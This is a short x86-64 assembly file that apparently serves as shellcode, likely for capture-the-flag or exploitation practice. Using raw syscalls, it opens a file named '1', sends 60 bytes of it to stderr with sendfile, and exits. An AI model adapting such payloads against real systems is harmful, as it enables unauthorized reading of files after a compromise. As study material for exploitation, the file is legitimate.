        .intel_syntax noprefix
        .global _start
        .text

_start:
open:
        // open 
        mov 	al, 0x2
        //const char __user * filename
        mov 	rdx, 0x31
//1
        push    rdx
        mov 	rdi, rsp
        // int flags
        xor 	rsi, rsi
        // umode_t mode
        xor 	rdx, rdx
        syscall
        push rax
sendfile:
        // size_t count
        mov     r10, 0x3c
        // loff_t__user * offset
        xor     rdx, rdx
        // int in_fd
        pop     rsi
        // int out_fd
	mov 	edi, 0x2
        mov     al, 40
        syscall
exit:   //exit
        mov     al, 60
        //xor     rdi, rdi // prob irrelevant
        syscall
